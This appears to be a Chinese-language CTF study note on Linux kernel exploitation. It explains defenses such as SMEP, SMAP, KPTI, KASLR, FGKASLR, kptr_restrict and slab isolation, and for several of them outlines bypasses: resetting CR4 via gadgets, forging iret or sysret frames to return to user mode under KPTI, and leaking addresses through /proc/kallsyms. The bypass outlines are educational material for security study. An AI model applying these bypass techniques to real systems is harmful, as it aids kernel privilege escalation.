-<h3 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h3><p>泄露敏感信息，这一点需要我们具有读取内核数据的能力。具体想要泄漏什么数据与利用场景紧密相关。</p>
-<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><p>对内核进行DoS相对容易，可以通过以下方式实现：</p>
-<ul>
-<li>触发内核中的某个漏洞让内核崩溃；</li>
-<li>触发内核中的死锁；</li>
-<li>触发大量的内核内存泄漏，即存在大量的内存被申请但是没有被释放；</li>
-</ul>
-<h2 id="Defense"><a href="#Defense" class="headerlink" title="Defense"></a>Defense</h2><h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>在内核的防御机制中，根据隔离的主体，我们将隔离分为两种：</p>
-<ul>
-<li>内核态和用户态的隔离</li>
-<li>内核自身内部不同对象间的隔离</li>
-</ul>
-<h4 id="user-amp-kernel-space"><a href="#user-amp-kernel-space" class="headerlink" title="user&amp;kernel space"></a>user&amp;kernel space</h4><p>主要方式有：</p>
-<p>这里主要有</p>
-<ul>
-<li>默认：用户态不可直接访问内核态的数据、执行内核态的代码</li>
-<li>KASLR：内核地址空间随机分布</li>
-<li>SMEP：内核态不可执行用户态的代码</li>
-<li>SMAP：内核态不可访问用户态的数据</li>
-<li>KPTI：用户态不可看到内核态的页表，内核态不可执行用户态的代码（模拟）</li>
-</ul>
-<h5 id="x86-SMEP"><a href="#x86-SMEP" class="headerlink" title="x86-SMEP"></a>x86-SMEP</h5><p>用户代码不可执行，Supervisor Mode Execution Protection。</p>
-<p>起初，在内核态执行代码时，可以直接执行用户态的代码。那如果攻击者控制了内核中的执行流，就可以执行处于用户态的代码。由于用户态的代码是攻击者可控的，所以更容易实施攻击。为了防范这种攻击，研究者提出当位于内核态时，不能执行用户态的代码。在 Linux 内核中，这个防御措施的实现是与指令集架构相关的。</p>
-<h6 id="CR4-20"><a href="#CR4-20" class="headerlink" title="CR4-20"></a>CR4-20</h6><p>CR4寄存器，第五号Control Register中的第20位用来标记是否开启SMEP保护；</p>
-<p><img src="/CTF/PWN/kernel-pwn/knowledge/basic-knowledge/cr4_smep.jpg" alt="cr4_smep"></p>
-<h6 id="open-amp-close"><a href="#open-amp-close" class="headerlink" title="open&amp;close"></a>open&amp;close</h6><p>开启：默认情况下，SMEP 保护是开启的。如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>+smep</code> 来开启 SMEP。</p>
-<p>关闭：在 <code>/etc/default/grub</code> 的如下两行中添加 nosmep：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;  </span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;initrd=/install/initrd.gz&quot;</span><br></pre></td></tr></table></figure>
-
-<p>然后运行 <code>update-grub</code> 并且重启系统就可以关闭 smep。</p>
-<p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nosmep</code> 来关闭 SMEP。</p>
-<h6 id="lookup-status"><a href="#lookup-status" class="headerlink" title="lookup status"></a>lookup status</h6><p>通过如下命令可以检查 SMEP 是否开启，如果发现了 smep 字符串就说明开启了 smep 保护，否则没有开启。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smep /proc/cpuinfo</span><br></pre></td></tr></table></figure>
-
-<h6 id="attack-SMEP"><a href="#attack-SMEP" class="headerlink" title="attack SMEP"></a>attack SMEP</h6><p>把 CR4 寄存器中的第 20 位置为 0 后，我们就可以执行用户态的代码。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。</p>
-<p>内核中修改 cr4 的代码最终会调用到 <code>native_write_cr4</code>，当我们能够劫持控制流后，我们可以执行内核中的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 <code>refresh_pce</code> 函数、<code>set_tsc_mode</code> 等函数里都有。</p>
-<h5 id="arm-PXN"><a href="#arm-PXN" class="headerlink" title="arm-PXN"></a>arm-PXN</h5><h5 id="x86-SMAP"><a href="#x86-SMAP" class="headerlink" title="x86-SMAP"></a>x86-SMAP</h5><p>用户数据不可访问，Supervisor Mode Access Protection；</p>
-<p>如果内核态可以访问用户态的数据，也会出现问题。比如在劫持控制流后，攻击者可以通过栈迁移将栈迁移到用户态，然后进行 ROP，进一步达到提权的目的。在 Linux 内核中，这个防御措施的实现是与指令集架构相关的。</p>
-<h6 id="CR4-21"><a href="#CR4-21" class="headerlink" title="CR4-21"></a>CR4-21</h6><p>CR4 寄存器中的第 21 位用来标记是否开启 SMEP 保护；</p>
-<p><img src="/CTF/PWN/kernel-pwn/knowledge/basic-knowledge/cr4_smap.jpg" alt="cr4_smap"></p>
-<h6 id="open-amp-close-1"><a href="#open-amp-close-1" class="headerlink" title="open&amp;close"></a>open&amp;close</h6><p>开启：默认情况下，SMAP 保护是开启的。如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>+smap</code> 来开启 SMAP。</p>
-<p>关闭：在 <code>/etc/default/grub</code> 的如下两行中添加 nosmap</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;  </span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;initrd=/install/initrd.gz&quot;</span><br></pre></td></tr></table></figure>
-
-<p>然后运行 <code>update-grub</code> ，重启系统就可以关闭 smap。</p>
-<p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nosmap</code> 来关闭 SMAP。</p>
-<h6 id="lookup-status-1"><a href="#lookup-status-1" class="headerlink" title="lookup status"></a>lookup status</h6><p>通过如下命令可以检查 SMAP 是否开启，如果发现了 smap 字符串就说明开启了 smap 保护，否则没有开启。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smap /proc/cpuinfo</span><br></pre></td></tr></table></figure>
-
-<h6 id="attack-SMAP"><a href="#attack-SMAP" class="headerlink" title="attack SMAP"></a>attack SMAP</h6><p>设置 CR4 寄存器<br>    把 CR4 寄存器中的第 21 位置为 0 后，我们就可以访问用户态的数据。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。<br>    内核中修改 cr4 的代码最终会调用到 <code>native_write_cr4</code>，当我们能够劫持控制流后，我们就可以执行内核中对应的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 <code>refresh_pce</code> 函数、<code>set_tsc_mode</code> 等函数里都有。</p>
-<p>copy_from/to_user<br>    在劫持控制流后，攻击者可以调用 <code>copy_from_user</code> 和 <code>copy_to_user</code> 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志。</p>
-<h5 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h5><p>Kernel Page Table Isolation最初目的是为了缓解KASLR的绕过以及CPU侧信道攻击；</p>
-<p>在KPTI机制中，内核态空间的内存和用户态空间的内存进行了更强的隔离；</p>
-<ul>
-<li><p>内核态中的页表包括用户空间内存的页表和内核空间内存的页表。</p>
-</li>
-<li><p>用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表（处理系统调用、终端信息的内存）</p>
-</li>
-</ul>
-<p><img src="/CTF/PWN/kernel-pwn/knowledge/basic-knowledge/kpti.jpg" alt="kpti"></p>
-<p>在 x86_64 的 KPTI 机制中，内核态的用户空间内存映射部分被全部标记为不可执行NX。也就是说，之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，在目前开启了 KPTI 保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存，只是不能跳转到用户态空间执行 Shellcode。</p>
-<p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110。</p>
-<h6 id="open-amp-close-2"><a href="#open-amp-close-2" class="headerlink" title="open&amp;close"></a>open&amp;close</h6><p>open：如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>kpti=1</code> 来开启 KPTI。</p>
-<p>close：如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nopti</code> 来关闭 KPTI。</p>
-<h6 id="lookup-status-2"><a href="#lookup-status-2" class="headerlink" title="lookup status"></a>lookup status</h6><p>我们可以通过以下两种方式来查看 KPTI 机制是否开启。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dmesg | grep &#x27;page table&#x27;</span><br><span class="line">[    0.000000] Kernel/User page tables isolation: enabled</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo | grep pti</span><br><span class="line">fpu_exception   : yes</span><br><span class="line">flags           : ... pti smep smap</span><br></pre></td></tr></table></figure>
-
-<h6 id="attack-KPTI"><a href="#attack-KPTI" class="headerlink" title="attack KPTI"></a>attack KPTI</h6><p>KPTI 机制和 SMAP 、SMEP 不太一样，由于与源码紧密结合，似乎没有办法在运行时刻关闭。</p>
-<p>攻击方法有：</p>
-<ol>
-<li><p>修改页表<br>在开启 KPTI 后，用户态空间的所有数据都被标记了 NX 权限，但是，我们可以考虑修改对应的页表权限，使其拥有可执行权限。当内核没有开启 smep 权限时，我们在修改了页表权限后就可以返回到用户态，并执行用户态的代码。</p>
-</li>
-<li><p>SWITCH_TO_USER_CR3_STACK<br>在开启 KPTI 机制后，用户态进入到内核态时，会进行页表切换；当从内核态恢复到用户态时，也会进行页表切换。那么如果我们可以控制内核执行返回用户态时所执行的切换页表的代码片段，也就可以正常地返回到用户态。通过分析内核态到用户态切换的代码，我们可以得知，页表的切换主要靠<code>SWITCH_TO_USER_CR3_STACK</code> 汇编宏。因此，我们只需要能够调用这部分代码即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.macro SWITCH_TO_USER_CR3_STACK scratch_reg:req</span><br><span class="line">    pushq   %rax</span><br><span class="line">    SWITCH_TO_USER_CR3_NOSTACK scratch_reg=\scratch_reg scratch_reg2=%rax</span><br><span class="line">    popq    %rax</span><br><span class="line">.endm</span><br><span class="line">.macro SWITCH_TO_USER_CR3_NOSTACK scratch_reg:req scratch_reg2:req</span><br><span class="line">    ALTERNATIVE &quot;jmp .Lend_\@&quot;, &quot;&quot;, X86_FEATURE_PTI</span><br><span class="line">    mov %cr3, \scratch_reg</span><br><span class="line"></span><br><span class="line">    ALTERNATIVE &quot;jmp .Lwrcr3_\@&quot;, &quot;&quot;, X86_FEATURE_PCID</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * Test if the ASID needs a flush.</span><br><span class="line">     */</span><br><span class="line">    movq    \scratch_reg, \scratch_reg2</span><br><span class="line">    andq    $(0x7FF), \scratch_reg      /* mask ASID */</span><br><span class="line">    bt  \scratch_reg, THIS_CPU_user_pcid_flush_mask</span><br><span class="line">    jnc .Lnoflush_\@</span><br><span class="line"></span><br><span class="line">    /* Flush needed, clear the bit */</span><br><span class="line">    btr \scratch_reg, THIS_CPU_user_pcid_flush_mask</span><br><span class="line">    movq    \scratch_reg2, \scratch_reg</span><br><span class="line">    jmp .Lwrcr3_pcid_\@</span><br><span class="line"></span><br><span class="line">.Lnoflush_\@:</span><br><span class="line">    movq    \scratch_reg2, \scratch_reg</span><br><span class="line">    SET_NOFLUSH_BIT \scratch_reg</span><br><span class="line"></span><br><span class="line">.Lwrcr3_pcid_\@:</span><br><span class="line">    /* Flip the ASID to the user version */</span><br><span class="line">    orq $(PTI_USER_PCID_MASK), \scratch_reg</span><br><span class="line"></span><br><span class="line">.Lwrcr3_\@:</span><br><span class="line">    /* Flip the PGD to the user version */</span><br><span class="line">    orq     $(PTI_USER_PGTABLE_MASK), \scratch_reg</span><br><span class="line">    mov \scratch_reg, %cr3</span><br><span class="line">.Lend_\@:</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>事实上，我们不仅希望切换页表，还希望能够返回到用户态，因此我们这里也需要复用内核中返回至用户态的代码。内核返回到用户态主要有两种方式：iret 和 sysret。下面详细介绍：</p>
-<p>iret</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line">#ifdef CONFIG_DEBUG_ENTRY</span><br><span class="line">    /* Assert that pt_regs indicates user mode. */</span><br><span class="line">    testb   $3, CS(%rsp)</span><br><span class="line">    jnz 1f</span><br><span class="line">    ud2</span><br><span class="line">1:</span><br><span class="line">#endif</span><br><span class="line">    POP_REGS pop_rdi=0</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span><br><span class="line">     * Save old stack pointer and switch to trampoline stack.</span><br><span class="line">     */</span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">    UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">    /* Copy the IRET frame to the trampoline stack. */</span><br><span class="line">    pushq   6*8(%rdi)   /* SS */</span><br><span class="line">    pushq   5*8(%rdi)   /* RSP */</span><br><span class="line">    pushq   4*8(%rdi)   /* EFLAGS */</span><br><span class="line">    pushq   3*8(%rdi)   /* CS */</span><br><span class="line">    pushq   2*8(%rdi)   /* RIP */</span><br><span class="line"></span><br><span class="line">    /* Push user RDI on the trampoline stack. */</span><br><span class="line">    pushq   (%rdi)</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * We are on the trampoline stack.  All regs except RDI are live.</span><br><span class="line">     * We can do future final exit work right here.</span><br><span class="line">     */</span><br><span class="line">    STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">    /* Restore RDI. */</span><br><span class="line">    popq    %rdi</span><br><span class="line">    SWAPGS</span><br><span class="line">    INTERRUPT_RETURN</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，通过伪造如下的栈，然后跳转到 <code>movq %rsp, %rdi</code>，我们就可以同时切换页表和返回至用户态。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake rax</span><br><span class="line">fake rdi</span><br><span class="line">RIP</span><br><span class="line">CS</span><br><span class="line">EFLAGS</span><br><span class="line">RSP</span><br><span class="line">SS</span><br></pre></td></tr></table></figure>
-
-<p>sysret</p>
-<p>在使用 sysret 时，我们首先需要确保 rcx 和 r11 为如下的取值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rcx, save the rip of the code to be executed when returning to userspace</span><br><span class="line">r11, save eflags</span><br></pre></td></tr></table></figure>
-
-<p>然后构造如下的栈</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake rdi</span><br><span class="line">rsp, the stack of the userspace</span><br></pre></td></tr></table></figure>
-
-<p>最后跳转至 entry_SYSCALL_64 的如下代码，即可返回到用户态。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">popq    %rdi</span><br><span class="line">popq    %rsp</span><br><span class="line">swapgs</span><br><span class="line">sysretq</span><br></pre></td></tr></table></figure>
-
-<p>signal handler</p>
-<p>我们也可以考虑在用户态注册 signal handler 来执行位于用户态的代码。在这种方式下，我们无需切换页表。</p>
-<h4 id="inside-kernel"><a href="#inside-kernel" class="headerlink" title="inside kernel"></a>inside kernel</h4><h5 id="chunk-isolaiton"><a href="#chunk-isolaiton" class="headerlink" title="chunk isolaiton"></a>chunk isolaiton</h5><p>根据描述，如果在使用 <code>kmem_cache_create</code> 创建一个 cache 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 cache 就会单独存在，不会与其它相同大小的 cache 合并。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Currently, if we want to account all objects of a particular kmem cache,</span><br><span class="line">we have to pass __GFP_ACCOUNT to each kmem_cache_alloc call, which is</span><br><span class="line">inconvenient. This patch introduces SLAB_ACCOUNT flag which if passed to</span><br><span class="line">kmem_cache_create will force accounting for every allocation from this</span><br><span class="line">cache even if __GFP_ACCOUNT is not passed.</span><br><span class="line"></span><br><span class="line">This patch does not make any of the existing caches use this flag - it</span><br><span class="line">will be done later in the series.</span><br><span class="line"></span><br><span class="line">Note, a cache with SLAB_ACCOUNT cannot be merged with a cache w/o</span><br><span class="line">SLAB_ACCOUNT, i.e. using this flag will probably reduce the number of</span><br><span class="line">merged slabs even if kmem accounting is not used (only compiled in).</span><br></pre></td></tr></table></figure>
-
-<p>在早期，许多结构体（如 <strong>cred 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 cache。在 Linux 4.5 版本引入了这个 flag 后，许多结构体就单独使用了自己的 cache。然而，根据上面的描述，这一特性似乎最初并不是为了安全性引入的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Mark those kmem allocations that are known to be easily triggered from</span><br><span class="line">userspace as __GFP_ACCOUNT/SLAB_ACCOUNT, which makes them accounted to</span><br><span class="line">memcg.  For the list, see below:</span><br><span class="line"></span><br><span class="line"> - threadinfo</span><br><span class="line"> - task_struct</span><br><span class="line"> - task_delay_info</span><br><span class="line"> - pid</span><br><span class="line"> - cred</span><br><span class="line"> - mm_struct</span><br><span class="line"> - vm_area_struct and vm_region (nommu)</span><br><span class="line"> - anon_vma and anon_vma_chain</span><br><span class="line"> - signal_struct</span><br><span class="line"> - sighand_struct</span><br><span class="line"> - fs_struct</span><br><span class="line"> - files_struct</span><br><span class="line"> - fdtable and fdtable-&gt;full_fds_bits</span><br><span class="line"> - dentry and external_name</span><br><span class="line"> - inode for all filesystems. This is the most tedious part, because</span><br><span class="line">   most filesystems overwrite the alloc_inode method.</span><br><span class="line"></span><br><span class="line">The list is far from complete, so feel free to add more objects.</span><br><span class="line">Nevertheless, it should be close to &quot;account everything&quot; approach and</span><br><span class="line">keep most workloads within bounds.  Malevolent users will be able to</span><br><span class="line">breach the limit, but this was possible even with the former &quot;account</span><br><span class="line">everything&quot; approach (simply because it did not account everything in</span><br><span class="line">fact).</span><br></pre></td></tr></table></figure>
-
-<h3 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h3><p>访问控制是指内核通过对某些对象添加访问控制，使得内核中相应的对象具有一定的访问控制要求，比如不可写，或者不可读；</p>
-<h4 id="dmesg-struct"><a href="#dmesg-struct" class="headerlink" title="dmesg_struct"></a>dmesg_struct</h4><p>考虑到内核日志中可能会有一些地址信息或者敏感信息，研究者提出需要对内核日志的访问进行限制。</p>
-<p>该选项用于控制是否可以使用 <code>dmesg</code> 来查看内核日志。当 <code>dmesg_restrict</code> 为 0 时，没有任何限制；当该选项为 1 时，只有具有 <code>CAP_SYSLOG</code> 权限的用户才可以通过 <code>dmesg</code> 命令来查看内核日志。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dmesg_restrict:</span><br><span class="line"></span><br><span class="line">This toggle indicates whether unprivileged users are prevented</span><br><span class="line">from using dmesg(8) to view messages from the kernel&#x27;s log buffer.</span><br><span class="line">When dmesg_restrict is set to (0) there are no restrictions. When</span><br><span class="line">dmesg_restrict is set set to (1), users must have CAP_SYSLOG to use</span><br><span class="line">dmesg(8).</span><br><span class="line"></span><br><span class="line">The kernel config option CONFIG_SECURITY_DMESG_RESTRICT sets the</span><br><span class="line">default value of dmesg_restrict.</span><br></pre></td></tr></table></figure>
-
-<h4 id="kptr-restrict-1"><a href="#kptr-restrict-1" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h4><p>该选项用于控制在输出内核地址时施加的限制，主要限制以下接口</p>
-<ul>
-<li>通过 /proc 获取的内核地址</li>
-<li>通过其它接口（有待研究）获取的地址</li>
-</ul>
-<p>具体输出的内容与该选项配置的值有关</p>
-<ul>
-<li>0：默认情况下，没有任何限制。</li>
-<li>1：使用 <code>％pK</code> 输出的内核指针地址将被替换为 0，除非用户具有 CAP_ SYSLOG 特权，并且 group id 和真正的 id 相等。</li>
-<li>2：使用 <code>％pK</code> 输出的内核指针都将被替换为 0 ，即与权限无关。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kptr_restrict:</span><br><span class="line"></span><br><span class="line">This toggle indicates whether restrictions are placed on</span><br><span class="line">exposing kernel addresses via /proc and other interfaces.</span><br><span class="line"></span><br><span class="line">When kptr_restrict is set to 0 (the default) the address is hashed before</span><br><span class="line">printing. (This is the equivalent to %p.)</span><br><span class="line"></span><br><span class="line">When kptr_restrict is set to (1), kernel pointers printed using the %pK</span><br><span class="line">format specifier will be replaced with 0&#x27;s unless the user has CAP_SYSLOG</span><br><span class="line">and effective user and group ids are equal to the real ids. This is</span><br><span class="line">because %pK checks are done at read() time rather than open() time, so</span><br><span class="line">if permissions are elevated between the open() and the read() (e.g via</span><br><span class="line">a setuid binary) then %pK will not leak kernel pointers to unprivileged</span><br><span class="line">users. Note, this is a temporary solution only. The correct long-term</span><br><span class="line">solution is to do the permission checks at open() time. Consider removing</span><br><span class="line">world read permissions from files that use %pK, and using dmesg_restrict</span><br><span class="line">to protect against uses of %pK in dmesg(8) if leaking kernel pointer</span><br><span class="line">values to unprivileged users is a concern.</span><br><span class="line"></span><br><span class="line">When kptr_restrict is set to (2), kernel pointers printed using</span><br><span class="line">%pK will be replaced with 0&#x27;s regardless of privileges.</span><br></pre></td></tr></table></figure>
-
-<p>当开启该保护后，攻击者就不能通过 <code>/proc/kallsyms</code> 来获取内核中某些敏感的地址了，如 commit_creds、prepare_kernel_cred。</p>
-<h3 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h3><h4 id="kernel-stack-canary"><a href="#kernel-stack-canary" class="headerlink" title="kernel stack canary"></a>kernel stack canary</h4><p>在 Linux 内核中，Canary 的实现是与架构相关的；</p>
-<p>在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护。</p>
-<h5 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h5><p>在 x86 架构中，同一个 task 中的系统调用使用相同的 Canary，因此只要泄露了一次系统调用中的canary，同一task的其他系统调用中的canary也都被泄露了；</p>
-<h3 id="randomization"><a href="#randomization" class="headerlink" title="randomization"></a>randomization</h3><p>增加内核的随机性来提高安全性；</p>
-<h4 id="kalsr"><a href="#kalsr" class="headerlink" title="kalsr"></a>kalsr</h4><p>以段为单位进行整体偏移的内核地址随机化；</p>
-<p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>kaslr</code> 来开启 KASLR。</p>
-<p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nokaslr</code> 来关闭 KASLR。</p>
-<p>通过泄漏内核某个段的地址，就可以得到这个段内的所有地址。比如当我们泄漏了内核的代码段地址，就知道内核代码段的所有地址。</p>
-<h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>鉴于 KASLR 的不足，有研究者实现了 FGKASLR。FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码，主要在两个部分进行了修改。目前，FGKASLR 只支持 x86_64 架构。</p>
-<h5 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h5><p><code>FGKASLR </code>利用 gcc 的编译选项 <code>-ffunction-sections</code> 把内核中<strong>不同的函数放到不同的 section 中</strong>。 在编译的过程中，任何使用 C 语言编写的函数以及不在特殊输入节的函数都会<strong>单独作为一个节</strong>；使用<strong>汇编编写</strong>的代码会<strong>位于一个统一的节中</strong>。</p>
-<p>编译后的 <strong>vmlinux</strong> 保留了所有的<strong>节区头（Section Headers）</strong>，以便于知道<strong>每个函数的地址范围</strong>。同时，FGKASLR 还有一个<strong>重定位地址的扩展表</strong>。通过这两组信息，<strong>内核在解压缩后就可以乱序排列函数</strong>。</p>
-<p>最后的 binary 的第一个段包含了一个合并节（由若干个函数合并而成）、以及若干其它单独构成一个节的函数。</p>
-<h5 id="加载阶段"><a href="#加载阶段" class="headerlink" title="加载阶段"></a>加载阶段</h5><p>在解压内核后，会<strong>首先检查保留的符号信息</strong>，然后<strong>寻找需要随机化的 <code>.text.*</code> 节区</strong>。其中，第一个合并的节区 (<code>.text</code>) 会被跳过，不会被随机化。后面节区的地址会被随机化，但仍然会与 <code>.text</code> 节区相邻。同时，FGKASLR 修改了已有的用于更新重定位地址的代码，不仅考虑了相对于加载地址的偏移，还考虑了函数节区要被移动到的位置。</p>
-<p>为了隐藏新的内存布局，**/proc/kallsyms 中符号使用随机的顺序来排列**。在 v4 版本之前，该文件中的符号按照字母序排列。</p>
-<p>通过分析代码，我们可以知道，在 <code>layout_randomized_image</code> 函数中<strong>计算了最终会随机化的节区，存储在 sections 里</strong>。</p>
